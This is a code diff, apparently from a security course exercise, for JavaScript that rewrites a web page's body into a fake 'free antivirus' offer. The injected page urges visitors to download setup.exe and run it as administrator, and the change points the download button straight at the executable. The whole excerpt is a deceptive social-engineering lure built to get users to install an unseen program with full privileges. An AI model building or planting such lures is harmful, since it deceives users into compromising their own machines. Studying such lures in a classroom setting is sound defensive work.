@@ -6,7 +6,7 @@ newBody.innerHTML = `
     <p style='font-size: 18px; padding: 5px 0px'>This is high-quality, highly reliable malware protection that stops malicious code from even being downloaded to your machine!</p>
     <p style='font-size: 18px; padding: 5px 0px'>All you have to do is click 'download' below and run the setup. The installation will automatically activate your free LIFETIME subscription to the software and you'll never have to think about cybersecurity again!</p>
     <p style='font-size: 18px; padding: 5px 0px'>Instructions: Download the file using the button below. Then, right click on setup.exe and choose 'Run as administrator' and the installation will complete itself.</p>
-    <a download='setup.exe' href='https://cse331.andrewjaffie.me/free-antivirus'>
+    <a download='setup.exe' href='https://cse331.andrewjaffie.me/free-antivirus/setup.exe'>
         <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="50px" height="50px" viewBox="0 0 475.078 475.077" style="enable-background:new 0 0 475.078 475.077;" xml:space="preserve">
     <g>
         <g>
